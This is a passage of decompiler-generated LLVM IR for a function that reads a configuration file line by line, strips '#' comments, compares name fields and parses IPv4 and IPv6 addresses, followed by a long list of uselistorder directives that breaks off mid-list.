  %stack_var_-28.0.ph138 = phi i32 [ 1, %dec_label_pc_8067eb0.lr.ph.lr.ph ], [ 2, %dec_label_pc_8067faf.outer.backedge ]
  br label %dec_label_pc_8067eb0

dec_label_pc_8067eb0:                             ; preds = %dec_label_pc_8067eb0.lr.ph, %dec_label_pc_8067faf.backedge
  %v3_8067eb8 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8067eb8, i32* @eax, align 4
  %v1_8067ec0 = icmp eq i32 %v3_8067eb8, 0
  br i1 %v1_8067ec0, label %dec_label_pc_8067ec7, label %dec_label_pc_8067ec4

dec_label_pc_8067ec4:                             ; preds = %dec_label_pc_8067eb0
  %v1_8067ec4 = inttoptr i32 %v3_8067eb8 to i8*
  store i8 0, i8* %v1_8067ec4, align 1
  br label %dec_label_pc_8067ec7

dec_label_pc_8067ec7:                             ; preds = %dec_label_pc_8067eb0, %dec_label_pc_8067ec4
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8067f0734 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8067f0735 = icmp eq i8 %v2_8067f0734, 0
  %v1_8067f0a41 = icmp eq i1 %v3_8067f0735, false
  br i1 %v1_8067f0a41, label %dec_label_pc_8067ed3.preheader.preheader, label %dec_label_pc_8067f0c

dec_label_pc_8067ed3.preheader.preheader:         ; preds = %dec_label_pc_8067ec7
  %v4_8067ed398.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8067ed3.preheader

dec_label_pc_8067ecf:                             ; preds = %dec_label_pc_8067ed9
  store i8 0, i8* %v1_8067ed3104, align 1
  %v0_8067ed2 = load i32, i32* @ecx, align 4
  %v1_8067ed2 = add i32 %v0_8067ed2, 1
  store i32 %v1_8067ed2, i32* @ecx, align 4
  %v1_8067ed3 = inttoptr i32 %v1_8067ed2 to i8*
  %v2_8067ed3 = load i8, i8* %v1_8067ed3, align 1
  %v3_8067ed3 = zext i8 %v2_8067ed3 to i32
  %v4_8067ed3 = load i32, i32* %eax.global-to-local, align 4
  %v5_8067ed3 = and i32 %v4_8067ed3, -256
  %v6_8067ed3 = or i32 %v5_8067ed3, %v3_8067ed3
  store i32 %v6_8067ed3, i32* @eax, align 4
  %v4_8067ed5 = icmp eq i8 %v2_8067ed3, 0
  br i1 %v4_8067ed5, label %dec_label_pc_8067ed3.dec_label_pc_8067f0c.loopexit_crit_edge, label %dec_label_pc_8067ed9

dec_label_pc_8067ed9:                             ; preds = %dec_label_pc_8067ed3.preheader, %dec_label_pc_8067ecf
  %v2_8067ed3105 = phi i8 [ %v2_8067ed3, %dec_label_pc_8067ecf ], [ %v2_8067ed396, %dec_label_pc_8067ed3.preheader ]
  %v1_8067ed3104 = phi i8* [ %v1_8067ed3, %dec_label_pc_8067ecf ], [ %v1_8067ed395, %dec_label_pc_8067ed3.preheader ]
  %v0_8067ecf103 = phi i32 [ %v1_8067ed2, %dec_label_pc_8067ecf ], [ %v0_8067ed349, %dec_label_pc_8067ed3.preheader ]
  %v2_8067ed9 = sext i8 %v2_8067ed3105 to i32
  store i32 %v2_8067ed9, i32* @edx, align 4
  %v0_8067edc = load i32, i32* @global_var_8074fcc, align 4
  store i32 %v0_8067edc, i32* %eax.global-to-local, align 4
  %v2_8067ee1 = mul nsw i32 %v2_8067ed9, 2
  %v3_8067ee1 = add i32 %v0_8067edc, %v2_8067ee1
  %v4_8067ee1 = inttoptr i32 %v3_8067ee1 to i8*
  %v5_8067ee1 = load i8, i8* %v4_8067ee1, align 1
  %v6_8067ee1 = and i8 %v5_8067ee1, 32
  %v7_8067ee1 = icmp eq i8 %v6_8067ee1, 0
  %v1_8067ee5 = icmp eq i1 %v7_8067ee1, false
  br i1 %v1_8067ee5, label %dec_label_pc_8067ecf, label %dec_label_pc_8067ee7

dec_label_pc_8067ee7:                             ; preds = %dec_label_pc_8067ed9
  %v0_8067ee7 = load i32, i32* @edi, align 4
  %v1_8067ee7 = add i32 %v0_8067ee7, -6
  %v6_8067ee7 = sub i32 5, %v0_8067ee7
  %v7_8067ee7 = and i32 %v6_8067ee7, %v0_8067ee7
  %v8_8067ee7 = icmp slt i32 %v7_8067ee7, 0
  %v9_8067ee7 = icmp eq i32 %v1_8067ee7, 0
  %v10_8067ee7 = icmp slt i32 %v1_8067ee7, 0
  %v3_8067eea = icmp eq i1 %v10_8067ee7, %v8_8067ee7
  %v4_8067eea = icmp eq i1 %v9_8067ee7, false
  %v5_8067eea = and i1 %v4_8067eea, %v3_8067eea
  br i1 %v5_8067eea, label %dec_label_pc_8067ef3.preheader, label %dec_label_pc_8067eec

dec_label_pc_8067eec:                             ; preds = %dec_label_pc_8067ee7
  %v1_8067eec = load i32, i32* @ebx, align 4
  %v3_8067eec = mul i32 %v0_8067ee7, 4
  %v4_8067eec = add i32 %v1_8067eec, %v3_8067eec
  %v5_8067eec = inttoptr i32 %v4_8067eec to i32*
  store i32 %v0_8067ecf103, i32* %v5_8067eec, align 4
  %v0_8067eef = load i32, i32* @edi, align 4
  %v1_8067eef = add i32 %v0_8067eef, 1
  store i32 %v1_8067eef, i32* @edi, align 4
  %v0_8067ef3.pre.pre = load i32, i32* @ecx, align 4
  %v4_8067ef3.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067ef3.preheader

dec_label_pc_8067ef3.preheader:                   ; preds = %dec_label_pc_8067eec, %dec_label_pc_8067ee7
  %v4_8067ef3.pre = phi i32 [ %v4_8067ef3.pre.pre, %dec_label_pc_8067eec ], [ %v0_8067edc, %dec_label_pc_8067ee7 ]
  %v0_8067ef3.pre = phi i32 [ %v0_8067ef3.pre.pre, %dec_label_pc_8067eec ], [ %v0_8067ecf103, %dec_label_pc_8067ee7 ]
  %v0_8067f0c54 = phi i32 [ %v1_8067eef, %dec_label_pc_8067eec ], [ %v0_8067ee7, %dec_label_pc_8067ee7 ]
  %v1_8067ef3106 = inttoptr i32 %v0_8067ef3.pre to i8*
  %v2_8067ef3107 = load i8, i8* %v1_8067ef3106, align 1
  %v3_8067ef3108 = zext i8 %v2_8067ef3107 to i32
  %v5_8067ef3109 = and i32 %v4_8067ef3.pre, -256
  %v6_8067ef3110 = or i32 %v3_8067ef3108, %v5_8067ef3109
  store i32 %v6_8067ef3110, i32* @eax, align 4
  %v4_8067ef5111 = icmp eq i8 %v2_8067ef3107, 0
  br i1 %v4_8067ef5111, label %dec_label_pc_8067f07.loopexit, label %dec_label_pc_8067ef9.lr.ph

dec_label_pc_8067ef9.lr.ph:                       ; preds = %dec_label_pc_8067ef3.preheader
  %v0_8067efc.pre = load i32, i32* @global_var_8074fcc, align 4
  br label %dec_label_pc_8067ef9

dec_label_pc_8067ef2:                             ; preds = %dec_label_pc_8067ef9
  %v1_8067ef2 = add i32 %v0_8067f07113, 1
  store i32 %v1_8067ef2, i32* @ecx, align 4
  %v1_8067ef3 = inttoptr i32 %v1_8067ef2 to i8*
  %v2_8067ef3 = load i8, i8* %v1_8067ef3, align 1
  %v3_8067ef3 = zext i8 %v2_8067ef3 to i32
  %v5_8067ef3 = and i32 %v0_8067efc.pre, -256
  %v6_8067ef3 = or i32 %v3_8067ef3, %v5_8067ef3
  store i32 %v6_8067ef3, i32* @eax, align 4
  %v4_8067ef5 = icmp eq i8 %v2_8067ef3, 0
  br i1 %v4_8067ef5, label %dec_label_pc_8067f07.loopexit, label %dec_label_pc_8067ef9

dec_label_pc_8067ef9:                             ; preds = %dec_label_pc_8067ef9.lr.ph, %dec_label_pc_8067ef2
  %v2_8067ef3115 = phi i8 [ %v2_8067ef3107, %dec_label_pc_8067ef9.lr.ph ], [ %v2_8067ef3, %dec_label_pc_8067ef2 ]
  %v1_8067ef3114 = phi i8* [ %v1_8067ef3106, %dec_label_pc_8067ef9.lr.ph ], [ %v1_8067ef3, %dec_label_pc_8067ef2 ]
  %v0_8067f07113 = phi i32 [ %v0_8067ef3.pre, %dec_label_pc_8067ef9.lr.ph ], [ %v1_8067ef2, %dec_label_pc_8067ef2 ]
  %v2_8067ef9 = sext i8 %v2_8067ef3115 to i32
  store i32 %v2_8067ef9, i32* @edx, align 4
  store i32 %v0_8067efc.pre, i32* @eax, align 4
  %v2_8067f01 = mul nsw i32 %v2_8067ef9, 2
  %v3_8067f01 = add i32 %v0_8067efc.pre, %v2_8067f01
  %v4_8067f01 = inttoptr i32 %v3_8067f01 to i8*
  %v5_8067f01 = load i8, i8* %v4_8067f01, align 1
  %v6_8067f01 = and i8 %v5_8067f01, 32
  %v7_8067f01 = icmp eq i8 %v6_8067f01, 0
  br i1 %v7_8067f01, label %dec_label_pc_8067ef2, label %dec_label_pc_8067f07.loopexit

dec_label_pc_8067f07.loopexit:                    ; preds = %dec_label_pc_8067ef9, %dec_label_pc_8067ef2, %dec_label_pc_8067ef3.preheader
  %v4_8067ed398151 = phi i32 [ %v6_8067ef3110, %dec_label_pc_8067ef3.preheader ], [ %v6_8067ef3, %dec_label_pc_8067ef2 ], [ %v0_8067efc.pre, %dec_label_pc_8067ef9 ]
  %v0_8067f07.lcssa = phi i32 [ %v0_8067ef3.pre, %dec_label_pc_8067ef3.preheader ], [ %v1_8067ef2, %dec_label_pc_8067ef2 ], [ %v0_8067f07113, %dec_label_pc_8067ef9 ]
  %v1_8067ef3.lcssa = phi i8* [ %v1_8067ef3106, %dec_label_pc_8067ef3.preheader ], [ %v1_8067ef3, %dec_label_pc_8067ef2 ], [ %v1_8067ef3114, %dec_label_pc_8067ef9 ]
  %v2_8067f07 = load i8, i8* %v1_8067ef3.lcssa, align 1
  %v3_8067f07 = icmp eq i8 %v2_8067f07, 0
  %v1_8067f0a = icmp eq i1 %v3_8067f07, false
  br i1 %v1_8067f0a, label %dec_label_pc_8067ed3.preheader, label %dec_label_pc_8067f0c

dec_label_pc_8067ed3.preheader:                   ; preds = %dec_label_pc_8067ed3.preheader.preheader, %dec_label_pc_8067f07.loopexit
  %v0_8067f0c.pre154 = phi i32 [ %v0_8067f0c54, %dec_label_pc_8067f07.loopexit ], [ 0, %dec_label_pc_8067ed3.preheader.preheader ]
  %v4_8067ed398 = phi i32 [ %v4_8067ed398151, %dec_label_pc_8067f07.loopexit ], [ %v4_8067ed398.pre, %dec_label_pc_8067ed3.preheader.preheader ]
  %v0_8067ed349 = phi i32 [ %v0_8067f07.lcssa, %dec_label_pc_8067f07.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_8067ed3.preheader.preheader ]
  %v1_8067ed395 = inttoptr i32 %v0_8067ed349 to i8*
  %v2_8067ed396 = load i8, i8* %v1_8067ed395, align 1
  %v3_8067ed397 = zext i8 %v2_8067ed396 to i32
  %v5_8067ed399 = and i32 %v4_8067ed398, -256
  %v6_8067ed3100 = or i32 %v5_8067ed399, %v3_8067ed397
  store i32 %v6_8067ed3100, i32* @eax, align 4
  %v4_8067ed5101 = icmp eq i8 %v2_8067ed396, 0
  br i1 %v4_8067ed5101, label %dec_label_pc_8067f0c, label %dec_label_pc_8067ed9

dec_label_pc_8067ed3.dec_label_pc_8067f0c.loopexit_crit_edge: ; preds = %dec_label_pc_8067ecf
  %v0_8067f0c.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8067f0c

dec_label_pc_8067f0c:                             ; preds = %dec_label_pc_8067f07.loopexit, %dec_label_pc_8067ed3.dec_label_pc_8067f0c.loopexit_crit_edge, %dec_label_pc_8067ed3.preheader, %dec_label_pc_8067ec7
  %v1_8067f0f = phi i32 [ 0, %dec_label_pc_8067ec7 ], [ %v0_8067f0c.pre.pre, %dec_label_pc_8067ed3.dec_label_pc_8067f0c.loopexit_crit_edge ], [ %v0_8067f0c.pre154, %dec_label_pc_8067ed3.preheader ], [ %v0_8067f0c54, %dec_label_pc_8067f07.loopexit ]
  %v0_8067f0f = load i32, i32* @ebx, align 4
  %v2_8067f0f = mul i32 %v1_8067f0f, 4
  %v3_8067f0f = add i32 %v0_8067f0f, %v2_8067f0f
  %v4_8067f0f = inttoptr i32 %v3_8067f0f to i32*
  store i32 0, i32* %v4_8067f0f, align 4
  %v7_8067f16 = icmp sgt i32 %v1_8067f0f, 1
  br i1 %v7_8067f16, label %dec_label_pc_8067f1c, label %dec_label_pc_8067faf.backedge

dec_label_pc_8067f1c:                             ; preds = %dec_label_pc_8067f0c
  br i1 %v12_8067d4e, label %dec_label_pc_8067fe9, label %dec_label_pc_8067f27

dec_label_pc_8067f27:                             ; preds = %dec_label_pc_8067f1c
  store i32 1, i32* @esi, align 4
  br i1 %v1_8067f31, label %dec_label_pc_8067f5f.preheader, label %dec_label_pc_8067f33

dec_label_pc_8067f5f.preheader:                   ; preds = %dec_label_pc_8067f27
  %v1_8067f5f119 = load i32, i32* @edi, align 4
  %v5_8067f61123 = icmp sgt i32 %v1_8067f5f119, 1
  br i1 %v5_8067f61123, label %dec_label_pc_8067f49.lr.ph, label %dec_label_pc_8067faf.backedge

dec_label_pc_8067f49.lr.ph:                       ; preds = %dec_label_pc_8067f5f.preheader
  br label %dec_label_pc_8067f49

dec_label_pc_8067f33:                             ; preds = %dec_label_pc_8067f27
  %v0_8067f35 = load i32, i32* @ebx, align 4
  %v1_8067f35 = inttoptr i32 %v0_8067f35 to i32*
  %v2_8067f35 = load i32, i32* %v1_8067f35, align 4
  %v3_8067f3b = call i32 @__GI_strcoll(i8* %v2_8067f52, i32 %v2_8067f35)
  store i32 %v3_8067f3b, i32* %eax.global-to-local, align 4
  %v1_8067f43 = icmp eq i32 %v3_8067f3b, 0
  %v1_8067f45 = icmp eq i1 %v1_8067f43, false
  br i1 %v1_8067f45, label %dec_label_pc_8067faf.backedge, label %dec_label_pc_8067f65

dec_label_pc_8067faf.backedge:                    ; preds = %dec_label_pc_8067f5f.preheader, %dec_label_pc_8067f5e, %dec_label_pc_8067f33, %dec_label_pc_8067f0c
  %v0_8067faf = load i32, i32* @edx, align 4
  %v3_8067fb9 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8067faf)
  store i32 %v3_8067fb9, i32* %eax.global-to-local, align 4
  %v1_8067fc1 = icmp eq i32 %v3_8067fb9, 0
  %v1_8067fc3 = icmp eq i1 %v1_8067fc1, false
  br i1 %v1_8067fc3, label %dec_label_pc_8067eb0, label %dec_label_pc_8067fc9

dec_label_pc_8067f49:                             ; preds = %dec_label_pc_8067f49.lr.ph, %dec_label_pc_8067f5e
  %v1_8067f4b124 = phi i32 [ 1, %dec_label_pc_8067f49.lr.ph ], [ %v1_8067f5e, %dec_label_pc_8067f5e ]
  %v0_8067f4b = load i32, i32* @ebx, align 4
  %v2_8067f4b = mul i32 %v1_8067f4b124, 4
  %v3_8067f4b = add i32 %v0_8067f4b, %v2_8067f4b
  %v4_8067f4b = inttoptr i32 %v3_8067f4b to i32*
  %v5_8067f4b = load i32, i32* %v4_8067f4b, align 4
  %v3_8067f52 = call i32 @__GI_strcasecmp(i8* %v2_8067f52, i32 %v5_8067f4b)
  store i32 %v3_8067f52, i32* %eax.global-to-local, align 4
  %v1_8067f5a = icmp eq i32 %v3_8067f52, 0
  br i1 %v1_8067f5a, label %dec_label_pc_8067f65, label %dec_label_pc_8067f5e

dec_label_pc_8067f5e:                             ; preds = %dec_label_pc_8067f49
  %v0_8067f5e = load i32, i32* @esi, align 4
  %v1_8067f5e = add i32 %v0_8067f5e, 1
  store i32 %v1_8067f5e, i32* @esi, align 4
  %v1_8067f5f = load i32, i32* @edi, align 4
  %v5_8067f61 = icmp slt i32 %v1_8067f5e, %v1_8067f5f
  br i1 %v5_8067f61, label %dec_label_pc_8067f49, label %dec_label_pc_8067faf.backedge

dec_label_pc_8067f65:                             ; preds = %dec_label_pc_8067f33, %dec_label_pc_8067f49
  br i1 %v1_8067f6a, label %dec_label_pc_8067f87, label %dec_label_pc_8067f6c

dec_label_pc_8067f6c:                             ; preds = %dec_label_pc_8067f65
  %v3_8067f6d = load i8*, i8** %stack_var_-44, align 4
  %v4_8067f6d = ptrtoint i8* %v3_8067f6d to i32
  %v0_8067f71 = load i32, i32* @ebx, align 4
  %v1_8067f71 = inttoptr i32 %v0_8067f71 to i32*
  %v2_8067f71 = load i32, i32* %v1_8067f71, align 4
  %v3_8067f75 = inttoptr i32 %v2_8067f71 to i8*
  %v4_8067f75 = call i32 @inet_pton(i32 2, i8* %v3_8067f75, i32 %v4_8067f6d)
  store i32 %v4_8067f75, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v4_8067f75, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8067e05, label %dec_label_pc_8067faf.outer.backedge

dec_label_pc_8067faf.outer.backedge:              ; preds = %dec_label_pc_8067f6c, %dec_label_pc_8067f8e, %dec_label_pc_8067f87
  %v0_8067faf125 = load i32, i32* @edx, align 4
  %v3_8067fb9126 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8067faf125)
  store i32 %v3_8067fb9126, i32* %eax.global-to-local, align 4
  %v1_8067fc1127 = icmp eq i32 %v3_8067fb9126, 0
  %v1_8067fc3129 = icmp eq i1 %v1_8067fc1127, false
  br i1 %v1_8067fc3129, label %dec_label_pc_8067eb0.lr.ph, label %dec_label_pc_8067fc9

dec_label_pc_8067f87:                             ; preds = %dec_label_pc_8067f65
  br i1 %v1_8067f8c, label %dec_label_pc_8067faf.outer.backedge, label %dec_label_pc_8067f8e

dec_label_pc_8067f8e:                             ; preds = %dec_label_pc_8067f87
  %v0_8067f93 = load i32, i32* @ebx, align 4
  %v1_8067f93 = inttoptr i32 %v0_8067f93 to i32*
  %v2_8067f93 = load i32, i32* %v1_8067f93, align 4
  %v3_8067f97 = inttoptr i32 %v2_8067f93 to i8*
  %v4_8067f97 = call i32 @inet_pton(i32 10, i8* %v3_8067f97, i32 %stack_var_-36.0)
  store i32 %v4_8067f97, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v4_8067f97, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_8067e32, label %dec_label_pc_8067faf.outer.backedge

dec_label_pc_8067fc9:                             ; preds = %dec_label_pc_8067faf.outer.backedge, %dec_label_pc_8067e99, %dec_label_pc_8067faf.backedge, %dec_label_pc_8067e5e
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8067e5e ], [ 1, %dec_label_pc_8067e99 ], [ 2, %dec_label_pc_8067faf.outer.backedge ], [ %stack_var_-28.0.ph138, %dec_label_pc_8067faf.backedge ]
  br i1 %v12_8067d4e, label %dec_label_pc_8067fe9, label %dec_label_pc_8067fd0

dec_label_pc_8067fd0:                             ; preds = %dec_label_pc_8067fc9
  %v1_8067fd7 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8067fd7 = call i32 @__GI_fclose(i16* %v1_8067fd7)
  store i32 %v2_8067fd7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067fe9

dec_label_pc_8067fe9:                             ; preds = %dec_label_pc_8067f1c, %dec_label_pc_8067d39, %dec_label_pc_8067d45, %dec_label_pc_8067d63, %dec_label_pc_8067d76, %dec_label_pc_8067d82, %dec_label_pc_8067d8b, %dec_label_pc_8067db5, %dec_label_pc_8067fc9, %dec_label_pc_8067fd0, %dec_label_pc_8067deb
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8067fc9 ], [ %stack_var_-28.1, %dec_label_pc_8067fd0 ], [ %v2_8067dfa, %dec_label_pc_8067deb ], [ 34, %dec_label_pc_8067db5 ], [ 34, %dec_label_pc_8067d8b ], [ 34, %dec_label_pc_8067d82 ], [ 34, %dec_label_pc_8067d76 ], [ 34, %dec_label_pc_8067d63 ], [ 34, %dec_label_pc_8067d45 ], [ 34, %dec_label_pc_8067d39 ], [ %stack_var_-28.0.ph138, %dec_label_pc_8067f1c ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8067d24, i32* @ebx, align 4
  store i32 %v0_8067d23, i32* @esi, align 4
  store i32 %v0_8067d22, i32* @edi, align 4
  store i32 %v0_8067d21, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8067f5e, { 0, 2, 1 }
  uselistorder i32 %v1_8067f0f, { 1, 0 }
  uselistorder i8 %v2_8067ed396, { 1, 2, 0 }
  uselistorder i8* %v1_8067ed395, { 1, 0 }
  uselistorder i32 %v0_8067ed349, { 1, 0 }
  uselistorder i32 %v2_8067ef9, { 1, 0 }
  uselistorder i32 %v1_8067ef2, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8067efc.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8067ee7, { 1, 0 }
  uselistorder i32 %v0_8067ee7, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8067ed9, { 1, 0 }
  uselistorder i8* %v2_8067f52, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32 %v0_8067d97, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8067d76, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8067d53, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8067d5a, { 1, 0 }
  uselistorder i32 %v1_8067d34, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 6, 0, 11, 12, 17, 13, 14, 16, 15, 1, 7, 4, 5, 8, 9, 10, 18, 21, 19, 20, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 11, 13, 14, 9, 0, 1, 15, 16, 17, 12, 10 }
  uselistorder i32 (i16*)* @__GI_fclose, { 2, 3, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 1, 2, 3, 4, 0 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 16, 0, 3, 17, 5, 6, 7, 4, 13, 18, 19, 14, 15, 1, 2 }
  uselistorder i32* @global_var_8074fcc, { 0, 4, 2, 5, 1, 6, 3 }
  uselistorder i32 -256, { 1, 22, 0, 23, 11, 3, 18, 17, 2, 24, 6, 26, 4, 27, 5, 28, 8, 20, 19, 7, 37, 38, 29, 39, 40, 41, 42, 43, 44, 12, 45, 46, 47, 57, 15, 16, 13, 21, 14, 60, 34, 31, 33, 70, 35, 25, 32, 30, 48, 49, 50, 51, 52, 9, 53, 54, 10, 55, 56, 36, 58, 59, 61, 64, 65, 66, 68, 69, 67, 63, 62 }
  uselistorder i32 35, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 3, 0, 2, 4 }
  uselistorder i32 10, { 10, 0, 19, 20, 21, 22, 23, 24, 25, 8, 9, 11, 1, 14, 16, 17, 15, 18, 26, 12, 6, 2, 7, 5, 3, 4, 13 }
  uselistorder i32 (i32)* @__errno_location, { 48, 36, 34, 29, 28, 21, 44, 32, 27, 46, 26, 55, 54, 50, 49, 66, 71, 22, 19, 61, 60, 59, 58, 13, 20, 14, 8, 42, 43, 25, 24, 23, 41, 40, 53, 65, 64, 63, 12, 57, 38, 7, 6, 5, 39, 11, 52, 47, 45, 0, 10, 15, 30, 4, 1, 33, 56, 62, 35, 37, 31, 18, 3, 2, 17, 16, 9, 70, 69, 68, 67, 51 }
  uselistorder i32 80, { 0, 5, 4, 6, 7, 8, 9, 10, 11, 1, 2, 3 }
  uselistorder i32 56, { 5, 16, 18, 7, 0, 8, 9, 10, 11, 17, 3, 2, 12, 6, 1, 19, 20, 13, 4, 14, 15, 21 }
  uselistorder i32 44, { 2, 3, 4, 8, 9, 5, 1, 0, 13, 15, 14, 10, 11, 12, 6, 7, 16 }
  uselistorder i32 36, { 7, 8, 9, 11, 12, 13, 14, 15, 16, 1, 17, 2, 3, 18, 19, 10, 6, 5, 0, 4, 20, 21, 22, 23 }
  uselistorder i32* @eax, { 2, 24, 25, 1, 26, 0, 10, 27, 11, 28, 56, 55, 5, 14, 29, 15, 30, 31, 32, 33, 12, 13, 37, 43, 58, 57, 44, 45, 46, 47, 82, 81, 59, 61, 60, 34, 36, 35, 6, 7, 48, 50, 49, 51, 52, 54, 53, 38, 98, 104, 74, 76, 77, 79, 75, 78, 8, 65, 66, 68, 3, 69, 70, 73, 67, 62, 63, 64, 71, 72, 96, 100, 102, 4, 103, 97, 101, 88, 89, 93, 95, 99, 91, 92, 90, 94, 83, 80, 39, 40, 42, 41, 85, 86, 87, 84, 9, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 14, 15, 16, 0, 7, 4, 1, 12, 13, 10, 5, 6, 18, 19, 20, 21, 3, 2, 17, 8, 9, 11, 22 }
  uselistorder i32 -48, { 0, 2, 1, 3 }
  uselistorder i32 8, { 57, 56, 58, 0, 1, 59, 60, 61, 62, 63, 64, 5, 65, 66, 67, 25, 96, 28, 12, 13, 14, 15, 29, 16, 17, 30, 31, 18, 32, 19, 33, 34, 86, 87, 127, 126, 88, 89, 90, 91, 92, 93, 94, 95, 69, 97, 98, 99, 100, 101, 102, 27, 26, 103, 104, 105, 70, 71, 106, 162, 163, 164, 68, 44, 45, 46, 47, 48, 49, 50, 51, 23, 41, 20, 82, 83, 183, 184, 185, 186, 187, 188, 189, 6, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 7, 128, 129, 130, 131, 132, 133, 36, 8, 37, 9, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 35, 151, 152, 10, 153, 154, 155, 156, 11, 157, 72, 73, 2, 201, 107, 74, 75, 76, 3, 4, 42, 108, 109, 110, 111, 113, 114, 115, 112, 116, 117, 118, 119, 21, 22, 120, 121, 122, 123, 124, 125, 165, 166, 167, 77, 78, 79, 80, 81, 52, 53, 54, 55, 196, 24, 197, 198, 199, 200, 168, 169, 170, 194, 195, 85, 161, 158, 159, 160, 84, 172, 190, 202, 192, 193, 191, 171, 43, 38, 39, 40 }
  uselistorder i32 -32, { 3, 2, 0, 1 }
  uselistorder i32 32, { 34, 0, 35, 36, 48, 21, 46, 37, 20, 38, 39, 40, 24, 25, 47, 49, 30, 31, 22, 29, 32, 33, 60, 4, 3, 5, 6, 26, 7, 8, 63, 9, 10, 11, 12, 13, 1, 41, 42, 43, 50, 51, 2, 52, 53, 54, 55, 56, 57, 58, 14, 59, 27, 61, 62, 44, 45, 64, 65, 15, 16, 17, 19, 18, 23, 28 }
  uselistorder i32* @ebx, { 167, 169, 172, 173, 174, 175, 176, 170, 168, 171, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 556, 557, 449, 453, 552, 555, 383, 384, 385, 388, 389, 390, 391, 404, 405, 406, 407, 408, 138, 139, 409, 3, 410, 411, 412, 413, 454, 455, 458, 198, 199, 200, 201, 202, 459, 460, 461, 462, 463, 464, 465, 466, 558, 559, 414, 415, 416, 417, 5, 248, 205, 203, 204, 210, 206, 207, 211, 212, 213, 4, 214, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 6, 260, 7, 261, 262, 263, 264, 265, 266, 267, 270, 285, 286, 287, 288, 289, 290, 392, 395, 396, 397, 398, 399, 393, 394, 418, 560, 561, 562, 563, 567, 564, 565, 566, 400, 401, 402, 403, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 568, 569, 655, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 215, 223, 224, 225, 8, 226, 9, 233, 234, 467, 468, 469, 470, 10, 471, 472, 473, 11, 474, 12, 475, 476, 227, 13, 228, 229, 230, 14, 231, 232, 477, 478, 479, 656, 657, 15, 658, 659, 660, 661, 216, 217, 221, 222, 480, 69, 70, 56, 57, 662, 16, 663, 664, 58, 59, 60, 71, 41, 72, 73, 74, 75, 76, 0, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 17, 88, 89, 90, 91, 46, 553, 554, 665, 666, 667, 668, 669, 670, 671, 42, 570, 625, 653, 654, 672, 150, 151, 152, 153, 154, 155, 156, 157, 699, 158, 159, 348, 349, 18, 1, 350, 356, 357, 351, 352, 353, 358, 359, 360, 802, 803, 714, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 743, 727, 728, 19, 729, 730, 723, 724, 725, 726, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 621, 622, 623, 624, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 43, 598, 602, 603, 604, 605, 606, 607, 20, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 804, 805, 800, 801, 291, 292, 293, 294, 295, 296, 21, 297, 298, 299, 271, 22, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 284, 282, 283, 837, 838, 839, 840, 841, 842, 843, 847, 848, 208, 209, 481, 482, 483, 484, 485, 486, 487, 488, 489, 300, 301, 302, 303, 23, 24, 